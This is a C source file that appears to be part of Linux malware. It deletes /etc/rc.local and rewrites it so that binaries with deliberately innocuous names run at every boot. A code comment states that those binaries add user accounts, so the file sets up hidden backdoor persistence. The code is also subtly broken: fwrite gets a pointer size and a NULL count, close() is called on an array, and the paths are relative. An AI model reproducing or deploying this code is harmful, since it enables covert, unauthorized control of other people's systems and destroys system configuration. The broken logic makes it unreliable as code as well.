#include <stdlib.h>
#include <stdio.h>

char *rclocalentry[] = {
    "#!/bin/sh -e\n",
    //generic name just to hide the binarys thats adding users.
    "./etc/passwdchk\n",
    "./etc/shadowchk\n",
    "exit 0"
};

int rc_local_entry(void) {
    int i;
    char *buf[1024] = {0};

    if(popen("/bin/rm -rf /etc/rc.local", "r")) {
#ifdef DEBUG
        printf("removed default rc.local file\n");
#endif
    }

    FILE *rclocal;
    rclocal = fopen("/etc/rc.local", "a+");
    for(i = 0; i < 4;i++) {
        if(rclocal != NULL) {
            if(fwrite(rclocalentry[i], sizeof(rclocalentry[i]), NULL, rclocal) != 0) {
#ifdef DEBUG
                printf("Successfully added rc.local entry %d\n", i);
#endif
            }
            close(buf);
        }
        if(rclocal == NULL) {
#ifdef DEBUG
            printf("Failed to add rc.local entry");
#endif
            return 0;
        }
    }
    return 1;
}